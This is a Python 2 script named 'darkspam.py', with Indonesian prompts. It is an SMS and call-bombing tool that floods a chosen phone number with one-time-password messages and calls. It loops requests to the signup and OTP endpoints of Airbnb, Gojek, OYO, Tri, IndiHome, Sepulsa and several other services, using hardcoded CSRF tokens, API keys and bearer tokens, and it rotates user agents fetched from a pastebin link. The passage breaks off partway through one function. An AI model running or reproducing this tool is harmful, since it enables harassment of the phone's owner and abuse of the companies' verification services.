# Python bytecode 2.7
try:
    from getpass import getpass
    import subprocess as sp, os, time, sys, requests, random, json
    from bs4 import BeautifulSoup as bs
except:
    print '%s[%s!%s] %sModule belum terinstall' % (W1, R1, W1, W0)
    spin()
    os.system('pip2 install requests bs4')
    print '%s[%s!%s] %sInstalasi selesai' % (W1, R1, W1, W0)
    print '%s[%s!%s] %sRun again' % (W1, R1, W1, W0)
    print '%s[%s!%s] %spython2 darkspam.py' % (W1, R1, W1, W0)
    metu()

G0 = '\x1b[0;32m'
G1 = '\x1b[1;32m'
C0 = '\x1b[0;36m'
C1 = '\x1b[1;36m'
P0 = '\x1b[0;35m'
P1 = '\x1b[1;35m'
W0 = '\x1b[0;37m'
W1 = '\x1b[1;37m'
B0 = '\x1b[0;34m'
B1 = '\x1b[1;34m'
R0 = '\x1b[0;31m'
R1 = '\x1b[1;31m'
Y1 = '\x1b[1;33m'
Y0 = '\x1b[0;33m'
BG = '\x1b[1;97;41m'
RE = '\x1b[0m'
r = '\x1b[91m'
c = '\x1b[96m'
w = '\x1b[0m'

def wait(t):
    for x in range(t):
        t -= 1
        sys.stdout.write('\r' + '\x1b[1;37m[\x1b[1;31m!\x1b[1;37m]\x1b[0;37m Tunggu ' + str(t) + 's')
        sys.stdout.flush()
        time.sleep(1)


def spin():
    try:
        L = '\\|/-'
        for q in range(10):
            time.sleep(0.1)
            sys.stdout.write('\r\x1b[1;32m[\x1b[1;33m' + L[(q % len(L))] + '\x1b[1;32m]\x1b[0;37m Loading please wait...')
            sys.stdout.flush()

    except:
        exit()


def ketik(teks):
    for i in teks + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.001)


def load(word):
    lix = ['/', '-', '\xe2\x95\xb2', '|']
    for i in range(5):
        for x in range(len(lix)):
            sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
            time.sleep(0.2)
            sys.stdout.flush()


def metu():
    print '%s[%sx%s] %sExiting Program' % (W1, R1, W1, R0)
    exit(1)


def koneksi():
    logo()
    try:
        rq = requests.get('http://github.com')
        spin()
        print '\n%s[%s#%s] %sKoneksi bagus' % (G1, Y1, G1, W0)
        time.sleep(2)
    except requests.exceptions.ConnectionError:
        print '%s[%sx%s] %sTidak ada koneksi' % (W1, R1, W1, W0)
        time.sleep(1)
        metu()


def call():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 628XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        call()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        call()
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    r = requests.Session()
    hd = {'content-length': '82', 'origin': 'https://www.airbnb.co.id', 'x-csrf-token': 'V4$.airbnb.co.id$NeEJZxARGJA$r3bBAEtLKJ7cH3yiFNUKlxsckvHI1tHK4uAJADeUn_A=', 'x-csrf-without-token': '1', 'user-agent': '{acak}', 'content-type': 'application/json', 'accept': 'application/json, text/javascript, */*; q=0.01', 'cache-control': 'no-cache', 'x-requested-with': 'XMLHttpRequest', 'referer': 'https://www.airbnb.co.id/signup_login', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id', headers=hd, json={'phoneNumber': no, 'workFlow': 'GLOBAL_SIGNUP_LOGIN', 'otpMethod': 'CALL'})
            if 'true' in a.text:
                print '\n%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                wait(60)
            else:
                print '\n%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                wait(60)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        call()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def src():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 628XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        src()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        src()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    r = requests.Session()
    head = {'content-length': '27', 'accept': '*/*', 'origin': 'https://nabil.my.id', 'x-requested-with': 'XMLHttpRequest', 'user-agent': '{acak}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://nabil.my.id/Ayo_Src_Bom', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://nabil.my.id/Tools/Prank-Tools/Ayo-Src/api.php', headers=head, data={'nomor': no, 'jumlah': '1'})
            if 'Terkirim' in str(a.text):
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(10)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(10)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        src()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def air():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 628XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        air()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        air()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    data = {'phoneNumber': no, 'workFlow': 'GLOBAL_SIGNUP_LOGIN', 'otpMethod': 'TEXT'}
    datajson = json.dumps(data)
    hd = {'origin': 'https://www.airbnb.co.id', 'x-csrf-token': 'V4$.airbnb.co.id$pgPRrSWF_-4$VvFL20hLPGSifNfUZuQFk0hBSM2sFv7ptbLjEn1qEp0=', 'x-csrf-without-token': '1', 'user-agent': '{acak}', 'content-type': 'application/json', 'accept': 'application/json, text/javascript, */*; q=0.01', 'cache-control': 'no-cache', 'x-requested-with': 'XMLHttpRequest', 'referer': 'https://www.airbnb.co.id/signup_login', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id', headers=hd, data=datajson)
            if 'success' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(10)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(10)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        air()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def ald():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 08XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        ald()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        ald()
    print
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = requests.post('https://www.misteraladin.com/api/members/otp/request', data={'phone_number_country_code': '62', 'phone_number': no, 'type': 'register'})
            if 'Coba lagi dalam 59 menit' in a.text:
                print '%s[%s%s%s] %sLimit 1 jam, coba lagi nanti' % (W1, R1, z, W1, W0)
                time.sleep(1)
            else:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(10)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        ald()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def tri():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 089XX (khusus no three)\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        tri()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        tri()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    head = {'Host': 'registrasi.tri.co.id', 'Connection': 'keep-alive', 'Content-Length': '59', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Origin': 'https://registrasi.tri.co.id', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': '{acak}', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Referer': 'https://registrasi.tri.co.id/daftar', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = requests.post('https://registrasi.tri.co.id/daftar/generateOTP', headers=head, data={'token': 'rU19E0PpDABQ5CVY2g7uXx7dlr4L5UQx', 'msisdn': no})
            if 'success' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(10)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(10)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        tri()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def oyo():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 8XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        oyo()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        oyo()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    r = requests.Session()
    hd = {'Host': 'www.oyorooms.com', 'xsrf-token': 'PyMZVXFT-wEDYO2Cl-2UYrh7FtvGLDywTnOI', 'user-agent': '{acak}', 'accept': '*/*', 'referer': 'https://www.oyorooms.com/login/?modal=signup', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.get('https://www.oyorooms.com/api/pwa/generateotp?phone=' + no + '&country_code=%2B62&nod=4&locale=id', headers=hd)
            if 'correct' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(10)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(10)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        oyo()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def coda():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 08XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        coda()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        coda()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    head = {'Host': 'revan.mohona.tv', 'Connection': 'keep-alive', 'Content-Length': '18', 'Accept': '*/*', 'Origin': 'http://revan.mohona.tv', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 'User-Agent': '{acak}', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'http://revan.mohona.tv/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6,da;q=0.5,pt;q=0.4,jv;q=0.3'}
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = requests.post('http://revan.mohona.tv/codapay2.php', headers=head, data={'target': no}).text
            print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
            time.sleep(1)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        coda()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def map():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 08XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        map()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        map()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    data = {'phone': no}
    datajson = json.dumps(data)
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://cmsapi.mapclub.com/api/signup-otp', data=datajson, headers={'Host': 'cmsapi.mapclub.com', 'Connection': 'keep-alive', 'Content-Length': '23', 'Accept': 'application/json, text/plain, */*', 'Origin': 'https://www.mapclub.com', 'Save-Data': 'on', 'User-Agent': '{acak}', 'content-type': 'application/json', 'Referer': 'https://www.mapclub.com/id/user/signup', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6,da;q=0.5,pt;q=0.4,jv;q=0.3'})
            if 'ok' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(10)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(10)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        map()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def gojek():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: +628XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        gojek()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        gojek()
    print
    hd = {'Accept': 'application/json', 'X-Platform': 'Android', 'X-UniqueId': 'd35889777f55fb15', 'X-AppVersion': '3.40.2', 'X-AppId': 'com.gojek.app', 'X-Session-ID': '2f62c15b-c2c8-4103-b9ee-fcb2e16f38b2', 'X-PhoneModel': 'samsung,SMJ111F', 'X-PushTokenType': 'FCM', 'X-DeviceOS': 'Android,5.1.1', 'User-uuid': '', 'X-DeviceToken': '', 'Authorization': 'Bearer', 'Accept-Language': 'id-ID', 'X-User-Locale': 'id_ID', 'Content-Type': 'application/json; charset=UTF-8', 'Content-Length': '101', 'Host': 'api.gojekapi.com', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.12.1'}
    data = {'phone': no}
    datajson = json.dumps(data)
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://api.gojekapi.com/v4/customers/login_with_phone', headers=hd, data=datajson)
            if '30 menit' in a.text:
                print '%s[%s%s%s] %sLimit 30 menit, coba lagi nanti' % (W1, R1, z, W1, W0)
                time.sleep(1)
            else:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(10)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        gojek()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def rupa():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 08XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        rupa()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        rupa()
    data = {'phone': no, 'action': 'register', 'channel': 'message', 'email': '', 'customer_id': '0', 'is_resend': '0'}
    datajson = json.dumps(data)
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'origin': 'https://m.ruparupa.com', 'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOWYyN2U2ODMtZmQ4My00MDQ0LWIzMDgtOTM1OWFhZTJlMDAyIiwiaWF0IjoxNTgzNjM5Mjg5LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.uIIXB3QCLDhDnFZ-9i90qtjicRXoRK6V622Dmfvnj1o', 'user-agent': '{acak}', 'content-type': 'application/json', 'accept': 'application/json', 'referer': 'https://m.ruparupa.com/verification?page=otp-choices', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://wapi.ruparupa.com/auth/generate-otp', headers=hd, data=datajson)
            if 'Kode verifikasi berhasil dikirimkan' in a.text:
                print '\n%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                wait(30)
            else:
                print '\n%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                wait(30)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        rupa()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def idh():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 08XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        idh()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        idh()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'origin': 'https://sobat.indihome.co.id', 'x-requested-with': 'XMLHttpRequest', 'user-agent': '{acak}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://sobat.indihome.co.id/register', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp', headers=hd, data={'type': 'hp', 'msisdn': no})
            if 'Kode verifikasi telah dikirim' in a.text:
                print '\n%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(10)
            else:
                print '\n%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(10)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        idh()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def phd2():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 8XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        phd2()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        phd2()
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'origin': 'https://www.phd.co.id', 'accept': 'application/json, text/javascript, */*; q=0.01', 'x-requested-with': 'XMLHttpRequest', 'user-agent': '{acak}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://www.phd.co.id/en/users/createnewuser', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://www.phd.co.id/en/users/createNewUser', headers=hd, data={'request_id': '', 'first_name': 'Yayak', 'last_name': 'Yk', 'gender': 'male', 'phone_number': no, 'birthday_d': '', 'birthday_m': '', 'birthday_y': '', 'birthday': '1999-03-01', 'username': 'yayakyk22@40gmail.com', 'password': 'Anjaymanar123$$', 'agreeterms': '1'})
            if 'OK' in a.text:
                print '\n%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                wait(30)
            else:
                print '\n%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                wait(30)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        phd2()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def spl():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 08XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        spl()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        spl()
    print
    data = {'phone_number': no}
    datajson = json.dumps(data)
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'accept': 'application/json, text/plain, */*', 'origin': 'https://m.sepulsa.com', 'authorization': 'bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJ3d3cuc2VwdWxzYS5jb20iLCJleHAiOjE1ODQzNTU3MzYsImlhdCI6MTU4Mzc1MDkzNiwic2NvcGUiOnsib3RwIjoicmVxdWVzdCJ9LCJqdGkiOiI2ZFdaMXJQU0tsMVAyVG16TTYxbDdtcmhuSlN1ei03MXJfVXN1Q1dIWDIwIiwiYXVkIjoiYmFnYXN0cmkzMkBnbWFpbC5jb20ifQ.La5TzFdePQg4vUEFfLfzII72u7_tHjd2mrOpG182BNb_8hfAzq1uPIVkpZhg141xVmbNT3SchjE6hSyU8RVPI4lceXGwMELzYsnXYDAbn3Z7GyZP90ZiEFwBIzWD66VHz0ALJRwX7mkuAGaZkVJlcqQEkOjqk4lpJsrtZouQt4xrVqibfJCkWrTYNaFbbw9WdKZNTmowdyOyZQ4JqawNDG59KjzgmwjwWeR8c79rBUDqQY9lDMkGEQR_TBBl3JP2xGpyTlUTy-IDTeP-Ini2ybyTinycbnbcqJoPqbN6pz5jR5WSowRLH7cqb16rv1rqE6aP1Bza_TjoGRFnWw5gtA', 'source': "frigate'", 'user-agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36', 'content-type': 'application/json', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://gaia.sepulsa.com/bumi/otp/request', headers=hd, data=datajson).text
            print a
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    print
    y = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        spl()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def red():
    logo()
    no = raw_input('\x1b[1;32m[\x1b[1;33m#\x1b[1;32m] \x1b[0;37mExample: 8XXX\n\x1b[1;32m[\x1b[1;33m#\x1b[1;32m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        red()
    jml = raw_input('\x1b[1;32m[\x1b[1;33m+\x1b[1;32m] \x1b[0;37mJumlah: ')
    if jml == '':
